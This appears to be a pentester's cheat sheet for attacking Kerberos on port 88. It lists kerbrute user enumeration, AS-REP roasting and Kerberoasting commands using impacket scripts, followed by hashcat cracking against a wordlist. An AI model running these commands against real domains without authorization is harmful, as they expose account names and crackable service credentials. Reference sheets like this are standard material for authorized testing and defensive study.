# Kerberos

**Port:** 88

**Quick Checklist**
- [ ] User enumeration possible?
- [ ] AS-REP roastable users?
- [ ] Kerberoastable SPNs?

```bash
kerbrute userenum --dc DC_IP -d DOMAIN.COM users.txt
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt
```

**AS-REP Roasting**
```bash
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

**Kerberoasting**
```bash
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 kerberoast.txt rockyou.txt
```
